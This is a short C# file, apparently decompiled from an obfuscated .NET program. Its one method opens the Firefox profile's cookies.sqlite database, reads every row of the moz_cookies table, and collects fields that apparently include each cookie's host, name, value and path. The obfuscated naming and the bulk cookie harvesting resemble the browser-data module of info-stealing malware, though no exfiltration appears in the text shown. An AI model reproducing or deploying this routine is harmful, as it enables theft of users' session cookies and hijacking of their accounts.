using System.Collections.Generic;
using System.IO;

internal class Class77
{
	public static List<Struct0> smethod_0(string string_0)
	{
		List<Struct0> list = new List<Struct0>();
		string text = Class53.smethod_2(string_0);
		if (text == null)
		{
			return list;
		}
		Class54 @class = Class54.smethod_1(Path.Combine(text, "cookies.sqlite"), "moz_cookies");
		if (@class == null)
		{
			return list;
		}
		for (int i = 0; i < @class.method_1(); i++)
		{
			Struct0 item = default(Struct0);
			item.String_0 = @class.method_0(i, 4);
			item.String_1 = @class.method_0(i, 2);
			item.String_5 = @class.method_0(i, 3);
			item.String_2 = @class.method_0(i, 5);
			item.String_3 = @class.method_0(i, 6);
			list.Add(item);
		}
		return list;
	}
}
